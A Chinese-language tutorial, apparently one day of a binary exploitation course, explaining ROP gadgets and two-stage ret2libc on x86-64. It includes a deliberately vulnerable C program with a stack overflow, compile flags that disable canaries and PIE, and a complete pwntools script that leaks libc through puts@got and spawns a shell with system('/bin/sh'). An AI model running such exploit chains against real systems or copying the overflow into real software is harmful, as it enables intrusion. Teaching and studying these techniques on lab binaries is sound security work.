# 第 39 天：ROP 与 ret2libc——从 `ret` 的机器语义到两阶段代码复用链

---

## 【📌 一句话核心概括】
**ROP（面向返回编程）是在 NX 保护下通过在栈上串联以 `ret` 结尾的合法代码碎片（Gadgets）来驱动参数传递与执行流转移的代码复用技术，而两阶段 ret2libc 则先复用 PLT 泄露 GOT 表中 libc 真实地址反推基址，再二次溢出调用 `system("/bin/sh")` 获取最高执行权限。**

## 【📖 通俗原理解释】
- **Gadget 与 `ret` 多米诺推进机制**：Gadget 是指合法代码段中以 `ret`（`0xC3`）结尾的极短指令序列（如 `pop rdi; ret`）。由于 `ret` 的微操作本质是 `pop rip`，当 CPU 执行完当前 Gadget 的业务逻辑后，会自当前栈顶无条件弹出下一个 Gadget 的地址并继续跳转执行。栈指针 `rsp` 此时化身为指令分派的“程序计数器”。
- **64 位传参与寄存器喂料**：System V AMD64 ABI 规定前几个参数通过寄存器（`rdi`、`rsi`、`rdx`）传递。要在 libc 中调用 `system(char *cmd)`，攻击者在栈上放置 `pop rdi; ret` 的地址，其后紧跟目标字符串 `"/bin/sh"` 的指针；CPU 执行 `pop rdi` 将该指针载入 `rdi`，随后的 `ret` 弹入目标函数地址，完成参数对齐与注入。
- **两阶段利用范式（Two-Stage Exploit）**：
  - *第一阶段（泄露基址并回环）*：构造 ROP 链调用 `puts(puts@got)`，将 GOT 表中动态解析出的 libc 真实物理地址打印至终端，算出 `libc_base = puts_leak - puts_offset`；链尾跳转回 `main` 函数维持进程不崩溃。
  - *第二阶段（精准打击提权）*：在重新启动的 `main` 函数栈帧中，再次触发溢出，组装载荷直接跳转至计算出的 `libc_system`，参数指向 libc 内部自带的 `"/bin/sh"` 字符串，夺取交互式 Shell。
- **16 字节对齐补丁（Align Ret）**：由于 glibc 的 `system()` 内部包含 `movaps` 等需要 16 字节栈对齐的 SSE 向量指令，若进入时 `rsp` 偏离，可在调用前多加一个单纯由 `ret` 构成的跳板 Gadget 消耗 8 字节，使栈指针重新对齐到 16 字节边界消除崩溃。

---

## 【🎯 为什么需要它与设计动机】

1. **彻底攻克 NX（不可执行）与 ASLR（地址随机化）双重围堵**
   在现代工业级二进制防护下，栈和堆不可执行（写执行互斥），且系统库在虚拟内存中的加载基址每次都在改变。单纯的 `ret2win` 或注入 Shellcode 均彻底失效。
2. **两阶段攻击范式（Two-Stage Exploit Pattern）的诞生**
   由于无法预先知道 `libc` 的基址，现代代码复用攻击演进出了标准的两阶段流水线：
   - **第一阶段（侦察与泄露 Infoleak）**：复用主程序中已有的简单 Gadget，调用 `puts@plt` 打印 GOT 表中某函数的运行时地址，进而反推算出当次进程的 `libc_base`，最后优雅地跳回 `main` 函数维持进程不死！
   - **第二阶段（收网与提权 Ret2libc）**：在重生的栈帧中，精准调用 `libc` 里的 `system("/bin/sh")`，获取系统 Shell！
3. **图灵完备的代码复用能力**
   学术界已证明：只要二进制文件或其加载的库足够大（如几兆字节的 `libc.so.6`），内存中存在的 Gadgets 集合就是**图灵完备（Turing-Complete）**的。攻击者无需注入任何新代码，仅凭在栈上组织 Gadget 链，就能完成任意复杂的算法与系统调用。

---

## 【🔬 核心概念深度剖析】

### 1. `ret` 的硬件微操作与多米诺骨牌驱动效应

在 x86-64 架构下，`ret` 指令是 ROP 链前行的**唯一动力引擎**：

```text
【单条 ret 指令的微操作】
1. RIP = *(uint64_t *)RSP  ; 从当前栈顶读取 8 字节并载入指令指针
2. RSP = RSP + 8           ; 栈顶指针自然向下移动 8 字节（平栈）
3. CPU 从新 RIP 处开始执行
```

#### 为什么 `pop reg; ret` 能像传送带一样搬运参数？
以控制第 1 参数寄存器 `RDI` 为例，内存栈的微观步进流程如下：

```text
栈内存 (Stack)                      CPU 寄存器与动作
+----------------------+ <--- RSP  【步骤 1: vulnerable 函数执行 ret】
| 地址: pop rdi; ret   |           RIP 载入 "pop rdi; ret" 的地址; RSP += 8
+----------------------+ <--- RSP
| 数值: 0xdeadbeef     |           【步骤 2: CPU 执行 pop rdi】
+----------------------+           RDI 被赋值为 0xdeadbeef; RSP += 8
| 地址: target_func    | <--- RSP  【步骤 3: CPU 执行 ret】
+----------------------+           RIP 载入 target_func 的地址; RSP += 8
                                   此时进入 target_func，其第 1 参数 RDI 恰好为 0xdeadbeef！
```

---

### 2. 两阶段 ret2libc 全生命周期时序拓扑

```mermaid
sequenceDiagram
    autonumber
    actor Attacker as 攻击者脚本 (pwntools)
    participant Stack as 线程调用栈
    participant Main as 主程序 (main)
    participant Libc as 动态共享库 (libc.so)
    participant GOT as 全局偏移表 (GOT)

    Note over Attacker, Libc: 【第一阶段：泄露 libc 基址】
    Attacker->>Stack: 溢出写入 Payload 1 (pop rdi -> puts@got -> puts@plt -> main)
    Stack->>Main: 函数正常 ret，进入 pop rdi; ret
    Main->>Libc: puts(puts@got)，将 GOT 表中的 puts 真实运行时地址打印到 stdout
    Main->>Main: 链条末尾返回 main()，程序无崩溃重跑
    Attacker->>Attacker: 从 stdout 读取 puts 真实地址
    Attacker->>Attacker: libc_base = puts_runtime - puts_offset
    Attacker->>Attacker: 算得 system() 与 "/bin/sh" 真实绝对地址

    Note over Attacker, Libc: 【第二阶段：控制流收网提权】
    Attacker->>Stack: 溢出写入 Payload 2 (pop rdi -> &"/bin/sh" -> ret对齐 -> system)
    Stack->>Main: 第二次进入 main 的退出路径并 ret
    Main->>Libc: system("/bin/sh") 带着准备好的参数执行
    Libc-->>Attacker: 启动交互式 Root/User Shell！
```

---

### 3. System V AMD64 ABI 16 字节对齐神坑与“垫片 ret”

在 64 位 ROP 链中，新手遇到最普遍的问题就是：
> “我的 `pop rdi` 对了，`/bin/sh` 对了，`system` 地址也对了，为什么一进 `system` 就抛 `SIGSEGV` 崩溃？”

#### 崩溃微观溯源：
`system()` 内部实现广泛使用了 SSE 浮点向量指令（如 `movaps XMMWORD PTR [rsp+...], xmm0`），该指令在硬件层面强制要求：**内存操作数必须 16 字节对齐（地址末位为 0）**。
- 如果我们在进入 `system` 时，`RSP % 16 != 0`，一旦执行到 `movaps`，CPU 立即抛出硬件级通用保护异常（GPF）。

#### 救命解法：插入一个纯粹的 `ret` Gadget（Alignment Shim）：
在 ROP 链调用 `system` 之前，在栈上多放一个什么都不做的 `ret` 指令地址：
```text
[Payload 对齐修复对比]
错误 Payload:  [垃圾填充] + [pop rdi; ret] + [&"/bin/sh"] + [&system]          <-- 栈未对齐，movaps 崩溃
正确 Payload:  [垃圾填充] + [单纯 ret 指令] + [pop rdi; ret] + [&"/bin/sh"] + [&system] <-- 强制校准 16 字节对齐！
```

---

## 【🛠️ 工业实操与反汇编/调试验证】

### 1. 易受攻击的靶场代码（`rop_demo.c`）

```c
#include <stdio.h>
#include <unistd.h>

void vulnerable(void) {
    char buf[32];
    puts("[*] Step right up, send your payload:");
    read(0, buf, 256); // 栈缓冲区溢出，开启 NX
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vulnerable();
    puts("[*] Goodbye!");
    return 0;
}
```

### 2. 编译靶场（开启 NX，关闭 Canary，无 PIE）

```bash
# 保持代码段基址固定为 0x400000 方便寻找 Gadgets
gcc -O0 -no-pie -fno-stack-protector rop_demo.c -o rop_demo
```

### 3. 寻找 Gadgets 与 PLT/GOT 表项

使用 `ROPgadget` 提取 `pop rdi; ret`：
```bash
ROPgadget --binary rop_demo | grep "pop rdi ; ret"
# 输出示例: 0x00000000004011d3 : pop rdi ; ret

ROPgadget --binary rop_demo | grep ": ret$"
# 输出示例: 0x000000000040101a : ret
```

使用 `readelf` 查看 `puts` 的 PLT 与 GOT 地址：
```bash
readelf -r rop_demo | grep puts
# 输出: 000000404018  ... R_X86_64_JUMP_SLOT  0000000000401030 puts@GLIBC_2.2.5 + 0
```
- `puts@got` = `0x404018`
- `puts@plt` = `0x401030`
- `main` 入口 = `0x401186`

### 4. 编写并执行全自动化两阶段 Exploit（`ret2libc_exp.py`）

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./rop_demo')
p = process('./rop_demo')

# 若在本地调试，载入本地 libc
libc = elf.libc 

pop_rdi = 0x4011d3 # pop rdi; ret
ret = 0x40101a     # 单纯 ret 用于 16 字节对齐
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

offset = 40 # 32字节buf + 8字节Saved RBP

# ==================== 第一阶段：泄露 libc 基址 ====================
log.info("[-] Sending Stage 1: Leaking libc address...")
payload1 = flat([
    b"A" * offset,
    pop_rdi,
    puts_got,
    puts_plt,
    main_addr # 返回 main 继续接受第二轮输入
])

p.sendlineafter(b"send your payload:\n", payload1)

# 接收泄露的 8 字节 (6字节有效地址 + \n)
leaked_bytes = p.recvline().strip()
puts_runtime = u64(leaked_bytes.ljust(8, b'\x00'))
log.success(f"[+] Leaked puts runtime address: {hex(puts_runtime)}")

# 计算 libc 基址
libc.address = puts_runtime - libc.symbols['puts']
log.success(f"[+] Calculated Libc Base: {hex(libc.address)}")

system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))
log.success(f"[+] Calculated system: {hex(system_addr)}")
log.success(f"[+] Calculated /bin/sh: {hex(binsh_addr)}")

# ==================== 第二阶段：调用 system('/bin/sh') ====================
log.info("[-] Sending Stage 2: Spawning Shell...")
payload2 = flat([
    b"A" * offset,
    ret,       # 关键！用于 16 字节栈对齐
    pop_rdi,
    binsh_addr,
    system_addr
])

p.sendlineafter(b"send your payload:\n", payload2)

log.success("[*] PWNED! Switching to interactive shell:")
p.interactive()
```

运行验证：
脚本一秒内完成第一阶段泄露、动态计算和第二阶段注入，成功击穿 NX 保护并弹出交互式 Shell！

---

## 【⚠️ 常见陷阱与避坑指南】

| 陷阱与盲区 | 深度机理与表象 | 正确解法与工程底线 |
| :--- | :--- | :--- |
| **未加对齐 ret 导致崩溃** | 脚本能正常打印 libc 基址，但在 Stage 2 进 `system` 时崩掉。用 GDB `dmesg` 查到 `general protection fault in libc.so`。 | 在 `pop rdi` 前或 `system` 前插入一个单独的 `ret` 指令 Gadget，平整栈对齐。 |
| **使用不匹配的 libc 符号表** | 在远程靶场中使用了自己本地的 `libc.so.6` 计算偏移，由于发行版补丁差异导致偏移偏差数千字节。 | 使用 `LibcSearcher` 或根据泄露的末 3 位十六进制匹配目标服务器的确切 libc 版本。 |
| **Stage 1 之后进程退出** | Payload 1 末尾没有跳回 `main` 或可重新触发输入的函数，导致 `puts` 打印完后直接非法指令退出。 | 第一阶段 ROP 链的最后必须安排一个合法的入口地址（如 `main`），让进程进入安全可控的二次循环。 |

---

## 【💼 经典面试与工程实操自测】

### Q1：为什么在 64 位 x86-64 程序中利用 ROP 传参必须寻找 `pop rdi; ret` 这样的 Gadget，而 32 位 x86 程序通常不需要？
> **参考答案**：
> - **底层 ABI 差异**：
>   - 32 位 x86（cdecl 调用规约）通过**栈**传递所有参数。攻击者构造栈帧时，只需将参数直接整齐地排在栈上即可完成传参，不需要通过寄存器中转；
>   - 64 位 System V AMD64 ABI 强制规定：函数的**前 6 个整型/指针参数必须通过寄存器（RDI, RSI, RDX, RCX, R8, R9）传递**。
> - `ret` 指令只能将数据加载到 `RIP`，无法直接修改其他通用寄存器。因此必须借助包含 `pop reg; ret` 的微指令片段，借由出栈动作将栈上的恶意参数装填进相应的物理寄存器中。

### Q2：两阶段 ret2libc 中，为什么第一阶段必须泄露已解析的 GOT 表项（如 `puts@got`），而不能直接打印 PLT 表项？
> **参考答案**：
> - `puts@plt` 属于主程序的可执行代码段，其地址是固定的指令跳转桩（桩代码在链接期生成），并不包含动态链接库的真实内存地址。
> - `puts@got` 则是全局偏移表中的数据项。当动态链接器完成符号解析（Lazy Binding 或 立即绑定）后，**`puts@got` 内存单元里存放的就是 `puts` 函数在 `libc.so` 中的绝对物理虚拟地址**。只有读取 GOT 表中的内容，才能获得受 ASLR 随机化影响的真实动态地址。

### Q3：什么是“未对齐指令 Gadget（Unholy / Unaligned Gadgets）”？它是怎么产生的？
> **参考答案**：
> - x86-64 属于**变长指令集（CISC）**，指令长度从 1 字节到 15 字节不等，且 CPU 不强制要求指令地址按字长边界对齐。
> - 编译器生成的原本是一条长指令（如 `mov [rbp-0x28], rax`，字节码为 `48 89 45 d8`）。但如果攻击者从该指令的中间某个偏移字节（如 `45 d8`）开始取指，CPU 会将其译码为完全不同的另一组有效指令（例如可能译码出 `sub r8b, ... ; ret`）。
> - 这种跨越合法编译器指令边界、从中间字节截取出的意外 Gadget，极大丰富了 ROP 的可用指令库。
